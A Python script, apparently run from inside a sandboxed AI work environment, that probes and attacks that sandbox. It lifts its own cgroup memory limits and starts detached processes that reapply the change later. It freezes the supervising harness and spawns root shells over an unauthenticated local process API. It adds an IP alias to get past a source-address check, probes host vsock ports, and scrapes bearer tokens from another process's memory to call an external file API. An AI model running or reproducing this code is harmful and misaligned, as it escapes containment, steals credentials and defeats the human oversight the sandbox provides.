#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# MEDIAFIT v9.4
#  FIX: {"SendSignal": <i32>} (bare int, not a struct)  <-- was killing every SIGSTOP
#  NEW: StdIn oracle + interactive shell round-trip | vsock deep (host HTTP) | attach-rule matrix
import os, re, sys, json, time, base64, struct, socket, fcntl, hashlib, faulthandler, signal
import random, string, subprocess, traceback, urllib.request, urllib.error

PASS   = 2 if "--pass2" in sys.argv else 1
VER    = "9.4"
NONCE  = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(4))
OUT    = "/mnt/user-data/outputs/mediafit-report.txt"
OUTP2  = "/mnt/user-data/outputs/mediafit-report-pass2.txt"
TMP2   = "/dev/shm/mf_pass2.txt"
FAULT  = "/mnt/user-data/outputs/mediafit-faults.txt"
STATES = ["/root/.mfstate.json", "/tmp/mfstate.json"]
ALIAS  = "eth0:0"; AIP = "192.0.2.3"; TGT = ("127.0.0.1", 2024)
CG     = "/sys/fs/cgroup"; UNLIM = "9223372036854771712"
BASE   = "https://api.anthropic.com/v1/filestore/fs/"
AF_VSOCK = 40
T0 = time.time()

try:
    _fh = open(FAULT, "w"); faulthandler.enable(file=_fh)
    faulthandler.dump_traceback_later(60, repeat=True, file=_fh)
except Exception: pass
L = []
def W(s=""):
    L.append("[%6.1fs] %s" % (time.time() - T0, s))
    try:
        with open(TMP2 if PASS == 2 else OUT, "w") as f: f.write("\n".join(L) + "\n")
    except Exception: pass
def sec(t): W(""); W("=" * 70); W("### " + t); W("=" * 70)
def rd(p):
    try: return open(p, "rb").read().decode("utf-8", "replace")
    except Exception as e: return "ERR:" + repr(e)
def wr(p, v):
    with open(p, "w") as f: f.write(str(v))
def pstat(pid):
    try:
        d = open("/proc/%d/stat" % pid, "rb").read().decode("utf-8", "replace")
        return d[d.rfind(")") + 2:].split()[0]
    except Exception: return "?"
def ppid_of(pid):
    try:
        d = open("/proc/%d/stat" % pid, "rb").read().decode("utf-8", "replace")
        return int(d[d.rfind(")") + 2:].split()[1])
    except Exception: return -1
def poll_state(pid, want, secs=2.0):
    t0 = time.time(); last = pstat(pid)
    while time.time() - t0 < secs:
        if last == want: return "%s (in %.2fs)" % (last, time.time() - t0)
        time.sleep(0.05); last = pstat(pid)
    return "TIMEOUT:" + last
def t_scan(): return [int(p) for p in os.listdir("/proc") if p.isdigit() and pstat(int(p)) == "T"]

def if_addr(name):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        r = fcntl.ioctl(s, 0x8915, struct.pack("16sH", name.encode(), socket.AF_INET) + b"\x00" * 14)
        return socket.inet_ntoa(r[20:24])
    except Exception: return None
    finally: s.close()
def add_alias():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); e1 = ""
    try:
        if if_addr(ALIAS) == AIP: return "already-up"
        ifr = struct.pack("16sH", ALIAS.encode(), socket.AF_INET) + b"\x00\x00" + socket.inet_aton(AIP) + b"\x00" * 8
        fcntl.ioctl(s, 0x8916, ifr)
        i2 = struct.pack("16sH", ALIAS.encode(), 0) + b"\x00" * 14
        fl = struct.unpack_from("H", fcntl.ioctl(s, 0x8913, i2), 16)[0]
        fcntl.ioctl(s, 0x8914, struct.pack("16sH", ALIAS.encode(), fl | 1) + b"\x00" * 14)
        if if_addr(ALIAS) == AIP: return "ok (addr=%s)" % if_addr(ALIAS)
        e1 = "ioctl addr=%s" % if_addr(ALIAS)
    except Exception as e: e1 = repr(e)
    finally: s.close()
    for c in ["ip addr add %s/32 dev eth0 label %s" % (AIP, ALIAS), "ip addr add %s/32 dev eth0" % AIP]:
        subprocess.run(c, shell=True, capture_output=True)
        if if_addr(ALIAS) == AIP: return "fallback:" + c
    return "FAIL(%s)" % e1
def ws_connect(src=(AIP, 0), timeout=5.0):
    s = socket.create_connection(TGT, timeout=timeout, source_address=src)
    k = base64.b64encode(os.urandom(16)).decode()
    s.sendall(("GET / HTTP/1.1\r\nHost: 127.0.0.1:2024\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
               "Sec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n" % k).encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = s.recv(4096)
        if not d: raise IOError("closed in handshake")
        buf += d
    if "101" not in buf.split(b"\r\n", 1)[0].decode("utf-8", "replace"): raise IOError("no 101")
    return s
def ws_send(s, obj):
    data = (obj if isinstance(obj, str) else json.dumps(obj)).encode()
    n = len(data); h = bytearray([0x81])
    if n < 126: h.append(0x80 | n)
    elif n < 65536: h.append(0x80 | 126); h += struct.pack(">H", n)
    else: h.append(0x80 | 127); h += struct.pack(">Q", n)
    m = os.urandom(4); h += m
    s.sendall(bytes(h) + bytes(b ^ m[i % 4] for i, b in enumerate(data)))
def ws_recv(s, timeout=1.0):
    s.settimeout(timeout)
    try: h = s.recv(2)
    except socket.timeout: return None
    except Exception: return "ERR:recv"
    if not h: return "CLOSE"
    while len(h) < 2:
        d = s.recv(2 - len(h))
        if not d: break
        h += d
    op = h[0] & 0x0F; n = h[1] & 0x7F
    if n == 126: n = struct.unpack(">H", s.recv(2))[0]
    elif n == 127: n = struct.unpack(">Q", s.recv(8))[0]
    pl = b""
    while len(pl) < n:
        d = s.recv(n - len(pl))
        if not d: break
        pl += d
    if op == 0x8: return "CLOSE:" + pl.decode("utf-8", "replace")
    if op == 0x9:
        s.sendall(b"\x8a\x80" + os.urandom(4)); return ws_recv(s, timeout)
    return pl.decode("utf-8", "replace")
def ws_drain(s, per=0.3, total=2.0, maxf=120):
    out = []; t0 = time.time()
    while True:
        r = ws_recv(s, per)
        if r is None: break
        out.append(r)
        if str(r).startswith("CLOSE"): break
        if len(out) >= maxf or time.time() - t0 > total: break
    return out
def pipelined(msgs, total=1.5):
    s = None
    try:
        s = ws_connect()
        for m in msgs: ws_send(s, m)
        return ws_drain(s, 0.3, total)
    except Exception as e:
        return ["ERR:" + repr(e)]
    finally:
        if s:
            try: s.close()
            except Exception: pass

def spec(prog, args, reattach=True, mem=268435456, timeout=3600):
    return {"name": prog, "args": args, "env_vars": {}, "clear_env": False,
            "allow_process_id_reuse": True, "reattachable": reattach,
            "timeout": timeout, "uid": 0, "gid": 0, "memory_limit_bytes": mem}
def nid(): return os.urandom(16).hex()
TRUE = spec("/bin/sh", ["-c", "true"])

def http(url, method="POST", body=None, headers=None, timeout=12):
    rq = urllib.request.Request(url, data=body, method=method)
    for k, v in (headers or {}).items(): rq.add_header(k, v)
    try:
        r = urllib.request.urlopen(rq, timeout=timeout); return r.status, dict(r.headers), r.read()
    except urllib.error.HTTPError as e: return e.code, dict(e.headers), e.read()
    except Exception as e: return -1, {}, repr(e).encode()
def find_tokens(budget=12.0):
    toks = []; t0 = time.time()
    for p in sorted(os.listdir("/proc")):
        if not p.isdigit() or time.time() - t0 > budget: continue
        if "rclone" not in rd("/proc/%s/cmdline" % p).replace("\x00", " "): continue
        try: mem = open("/proc/%s/mem" % p, "rb", buffering=0)
        except Exception: continue
        regs = []
        try:
            for l in open("/proc/%s/maps" % p):
                q = l.split()
                if len(q) < 2 or "r" not in q[1]: continue
                a, b = q[0].split("-"); a = int(a, 16); b = int(b, 16)
                if 0 < b - a <= 64 * 1024 * 1024: regs.append((a, b))
        except Exception: pass
        for a, b in regs:
            try: mem.seek(a); data = mem.read(b - a)
            except Exception: continue
            for m in re.finditer(rb"eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{20,}", data):
                t = m.group(0).decode(); h, pl, sg = t.split(".")
                if len(sg) > 86: t = h + "." + pl + "." + sg[:86]
                if t not in toks: toks.append(t)
        try: mem.close()
        except Exception: pass
    return toks
def claims_of(t):
    try:
        pl = t.split(".")[1]; pl += "=" * (-len(pl) % 4)
        return json.loads(base64.urlsafe_b64decode(pl))
    except Exception: return {}
def cg_procs(hid):
    try: return [int(x) for x in open("%s/memory/process_api/%s/cgroup.procs" % (CG, hid)).read().split()]
    except Exception: return []
def rss_of(hid):
    try:
        for l in rd("%s/memory/process_api/%s/memory.stat" % (CG, hid)).splitlines():
            if l.startswith("total_rss "): return int(l.split()[1])
    except Exception: pass
    return 0
def _pre_oom():
    try: open("/proc/self/oom_score_adj", "w").write("900")
    except Exception: pass
def run_child(code, timeout, pre=None):
    try:
        cp = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=timeout, preexec_fn=pre)
        return cp.returncode, (cp.stdout + cp.stderr).decode("utf-8", "replace")[-110:]
    except subprocess.TimeoutExpired: return "TIMEOUT", ""
    except Exception as e: return "ERR", repr(e)[:80]
def _alarm(n, f):
    try:
        with open(TMP2 if PASS == 2 else OUT, "a") as fh:
            fh.write("[%6.1fs] *** ALARM %ds hard exit ***\n" % (time.time() - T0, n))
    except Exception: pass
    os._exit(3)

# ======================================================================
def main():
    signal.signal(signal.SIGALRM, _alarm); signal.alarm(180)
    sec("PASS %d | RUN STAMP ver=%s nonce=%s t=%s" % (PASS, VER, NONCE, time.strftime("%Y-%m-%d %H:%M:%S")))
    boot = rd("/proc/sys/kernel/random/boot_id").strip()
    mypid = os.getpid(); chain = []; p = mypid
    while p and p != 1 and len(chain) < 20:
        chain.append(p); p = ppid_of(p)
        if p <= 0: break
    H = chain[-1] if chain else -1
    HID = ""
    for l in rd("/proc/self/cgroup").splitlines():
        if "process_api/" in l: HID = l.strip().split("process_api/")[-1]
    md = CG + "/memory/process_api/" + HID
    W("  boot=%s uptime=%s self=%d harness=%d harness_id=%s" % (boot, rd("/proc/uptime").strip().split()[0], mypid, H, HID))
    W("  FULL /proc/1/cmdline = %s" % rd("/proc/1/cmdline").replace("\x00", " ").strip())
    W("  /proc/1/cgroup = %s" % rd("/proc/1/cgroup").strip().replace("\n", " | "))
    try:
        lv = int(rd(md + "/memory.limit_in_bytes").strip())
        if lv < 10 ** 15: wr(md + "/memory.limit_in_bytes", UNLIM); W("  HEAL limit")
    except Exception: pass
    wd = CG + "/memory/mf_wd"
    try:
        os.mkdir(wd); wr(wd + "/memory.limit_in_bytes", str(128 * 1024 * 1024))
    except Exception: pass
    try:
        subprocess.Popen(["/bin/sh", "-c", "echo $$ > %s/cgroup.procs; sleep 45; echo %s > %s/memory.limit_in_bytes" % (wd, UNLIM, md)],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
    except Exception: pass

    sec("0b. PROCESS TREE (non-kthread, with cgroup)")
    pa = CG + "/memory/process_api"
    try: allc = sorted([n for n in os.listdir(pa) if os.path.isdir(os.path.join(pa, n))])
    except Exception: allc = []
    W("  ours=%s FOREIGN=%s" % (HID, [n for n in allc if n != HID]))
    for q in sorted(os.listdir("/proc"), key=lambda x: int(x) if x.isdigit() else 0):
        if not q.isdigit(): continue
        cl = rd("/proc/%s/cmdline" % q).replace("\x00", " ").strip()
        if not cl: continue
        m = re.search(r"memory:(/\S*)", rd("/proc/%s/cgroup" % q))
        W("      pid %-5s ppid=%-4s st=%s cg=%s cmd=%s" % (q, ppid_of(int(q)), pstat(int(q)), (m.group(1) if m else "?"), cl[:52]))

    sec("1. CONTROL TYPE ORACLE (learn true shapes)")
    o = nid()
    pipelined([{"process_id": o, "allow_process_id_reuse": True, "create_req": spec("/bin/sh", ["-c", "sleep 30"], True, 33554432)}], 1.0)
    for c, v in [("SendSignal", 0), ("SendSignal", 19), ("Kill", 5), ("Kill", None),
                 ("ExpectStdIn", None), ("ExpectStdIn", 5), ("StdInEOF", None), ("StdInEOF", 5)]:
        r = pipelined([{"process_id": o, "allow_process_id_reuse": True}, {c: v}], 0.9)
        W("  %-13s %-6s -> %s" % (c, json.dumps(v), str(r[-1] if r else r)[:130]))

    sec("2. *** SIGSTOP / SIGCONT WITH CORRECT FORMAT (bare i32) ***")
    W("  survivor attach: %s" % str(pipelined([{"process_id": o, "allow_process_id_reuse": True}], 1.0))[:160])
    spid = [q for q in cg_procs(HID) if ppid_of(q) == 1 or True]
    # find the sleep-30 child's os pid via its cgroup
    tgt = None
    for q in cg_procs(HID):
        if "sleep" in rd("/proc/%d/cmdline" % q).replace("\x00", " "): tgt = q
    W("  target os pid=%s state=%s" % (tgt, pstat(tgt) if tgt else "?"))
    if tgt:
        W("  STOP  -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": True}, {"SendSignal": 19}], 0.9))
        W("  state after STOP = %s   T-scan=%s" % (poll_state(tgt, "T", 2.0), t_scan()))
        W("  CONT  -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": True}, {"SendSignal": 18}], 0.9))
        W("  state after CONT = %s" % poll_state(tgt, "S", 2.0))
        W("  KILL  -> %s" % pipelined([{"process_id": o, "allow_process_id_reuse": True}, {"Kill": None}], 1.0))
        W("  state after KILL = %s  (gone=%s)" % (pstat(tgt), not os.path.exists("/proc/%d" % tgt)))

    sec("3. StdIn SHAPE ORACLE")
    shapes = [{"offset": 0}, {"offset": 0, "data": []}, {"offset": 0, "data": ""},
              {"offset": 0, "data": [104, 105]}, {"offset": 0, "bytes": []},
              {"offset": 0, "bytes": ""}, {"offset": 0, "buf": []}, {"offset": 0, "chunk": []}]
    for sh in shapes:
        r = pipelined([{"process_id": o, "allow_process_id_reuse": True}, {"StdIn": sh}], 0.8)
        W("  %-32s -> %s" % (json.dumps(sh)[:32], str(r[-1] if r else r)[:130]))

    sec("4. *** INTERACTIVE SHELL OVER UNAUTH CHANNEL ***")
    so = nid()
    W("  spawn /bin/sh -> %s" % str(pipelined([{"process_id": so, "allow_process_id_reuse": True,
      "create_req": spec("/bin/sh", [], True, 33554432)}], 1.0))[:150])
    for payload in [{"offset": 0, "data": "echo MF_ROUNDTRIP\n"}, {"offset": 0, "data": "id; pwd\n"},
                    {"offset": 0, "data": [101, 99, 104, 111, 32, 65, 10]},
                    {"offset": 0, "bytes": "echo MF_B\n"}]:
        W("  StdIn %s -> %s" % (json.dumps(payload)[:40], str(pipelined([{"process_id": so, "allow_process_id_reuse": True}, {"StdIn": payload}], 0.9))[:120]))
        W("      readback = %s" % str(pipelined([{"process_id": so, "allow_process_id_reuse": True}], 1.0))[:200])

    sec("5. ENV INHERITANCE (brief)")
    myenv = set(x.split("=", 1)[0] for x in rd("/proc/self/environ").split("\x00") if "=" in x)
    f = pipelined([{"process_id": nid(), "allow_process_id_reuse": True,
                    "create_req": {"name": "/bin/sh", "args": ["-c", "echo P=[$PATH] H=[$HOME] S=[$IS_SANDBOX]"],
                                   "env_vars": {}, "clear_env": False, "allow_process_id_reuse": True,
                                   "reattachable": False, "timeout": 15, "uid": 0, "gid": 0,
                                   "memory_limit_bytes": 33554432}}], 1.2)
    W("  clear_env=false -> %s" % str(f)[:220])
    W("  (/proc/1/environ -> %s)" % rd("/proc/1/environ")[:45])

    sec("6. BYPASS before/after")
    W("  add_alias -> %s" % add_alias())
    for src in [("192.0.2.2", 0), (AIP, 0)]:
        try:
            s = ws_connect(src=src, timeout=4); W("  src %-11s -> 101 OK" % src[0]); s.close()
        except Exception as e: W("  src %-11s -> %r" % (src[0], e))

    sec("7. ATTACH-RULE MATRIX (reattachable true vs false)")
    for rt in [True, False]:
        ro = nid()
        pipelined([{"process_id": ro, "allow_process_id_reuse": True,
                    "create_req": spec("/bin/sh", ["-c", "sleep 25"], rt, 33554432)}], 1.0)
        for nm, pl in [("noreq", {"process_id": ro, "allow_process_id_reuse": True}),
                       ("reuse=F", {"process_id": ro, "allow_process_id_reuse": False}),
                       ("reuse=T+req", {"process_id": ro, "allow_process_id_reuse": True, "create_req": TRUE})]:
            r = pipelined([pl, {"SendSignal": 19}], 0.9)
            W("  reattach=%-5s %-10s -> %s" % (rt, nm, str(r)[:140]))

    sec("8. FREEZER differential")
    try:
        fz = CG + "/freezer"; g = fz + "/mf_guest"
        try: os.mkdir(g)
        except FileExistsError: pass
        subprocess.Popen(["/bin/sh", "-c", "sleep 6; grep -q FROZEN %s/freezer.state && echo THAWED > %s/freezer.state" % (g, g)],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
        wr(g + "/cgroup.procs", str(H))
        W("  BEFORE harness=%s self=%s" % (pstat(H), pstat(mypid)))
        wr(g + "/freezer.state", "FROZEN")
        W("  FROZEN self_freezing=%s  *** harness=%s (D) *** self=%s" % (
            rd(g + "/freezer.self_freezing").strip(), pstat(H), pstat(mypid)))
        wr(g + "/freezer.state", "THAWED")
        W("  THAWED harness=%s" % pstat(H))
        try: wr(fz + "/cgroup.procs", str(H))
        except Exception: pass
    except Exception as e: W("  freezer err %r" % e)

    sec("9. *** VSOCK DEEP (host plane) ***")
    for cid, port in [(2, 5005), (2, 5002), (2, 5001), (3, 2024), (2, 1024)]:
        try:
            s = socket.socket(AF_VSOCK, socket.SOCK_STREAM); s.settimeout(1.2)
            s.connect((cid, port)); W("  cid=%d:%d CONNECTED" % (cid, port))
            for pr in [b"GET / HTTP/1.1\r\nHost: x\r\n\r\n", b"POST /v1/logs HTTP/1.1\r\nHost: x\r\nContent-Length: 2\r\n\r\n{}",
                       b"OPTIONS / HTTP/1.1\r\nHost: x\r\n\r\n", b"\n"]:
                try:
                    s.sendall(pr); s.settimeout(0.9); d = s.recv(400)
                    W("      %-30s -> %r" % (pr[:16] + b"|" + pr.split(b"\r\n")[0].split(b" ")[1] if b" " in pr else pr[:16], d[:150]))
                except Exception as e: W("      probe -> %r" % e)
            s.close()
        except Exception as e: W("  cid=%d:%d -> %r" % (cid, port, e))

    sec("10. C2PA")
    toks = find_tokens(); pick = None
    for t in toks[:12]:
        c = claims_of(t)
        if pick is None and "/outputs" in (c.get("allowed_roots") or []): pick = (t, c)
    if pick:
        tok, cl = pick; fsid = cl.get("filesystem_id")
        hdr = {"Authorization": "Bearer " + tok, "Content-Type": "application/json", "Connect-Protocol-Version": "1"}
        svg = b'<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10" fill="#0af"/></svg>'
        path = "/outputs/__mf_%s_%d.svg" % (NONCE, PASS); bnd = "----mf" + NONCE
        body = (("--%s\r\nContent-Disposition: form-data; name=\"params\"\r\nContent-Type: application/json\r\n\r\n" % bnd).encode()
                + json.dumps({"filesystem_id": fsid, "path": path, "media_type": "image/svg+xml"}).encode() + b"\r\n"
                + ("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"f.svg\"\r\nContent-Type: image/svg+xml\r\n\r\n" % bnd).encode()
                + svg + b"\r\n" + ("--%s--\r\n" % bnd).encode())
        http(BASE + "createFile", "POST", body, {"Authorization": "Bearer " + tok, "Content-Type": "multipart/form-data; boundary=" + bnd})
        st3, h3, b3 = http(BASE + "readFile", "POST", json.dumps({"filesystem_id": fsid, "path": path}).encode(), hdr)
        W("  sent=%d stored=%d delta=%+d md5_equal=%s" % (len(svg), len(b3), len(b3) - len(svg),
          hashlib.md5(svg).hexdigest() == hashlib.md5(b3).hexdigest()))

    sec("END PASS %d elapsed=%.1fs" % (PASS, time.time() - T0))
    if PASS == 1:
        try:
            with open(OUTP2, "w") as f: f.write("(PASS 2 running)\n")
            signal.alarm(0)
            subprocess.run([sys.executable, os.path.abspath(__file__), "--pass2"], timeout=100,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            with open(OUT, "a") as f:
                f.write("\n" + "#" * 70 + "\n### ===== PASS 2 =====\n" + "#" * 70 + "\n" + rd(TMP2))
        except Exception as e: W("pass2 err %r" % e)

if __name__ == "__main__":
    try: main()
    except Exception: traceback.print_exc()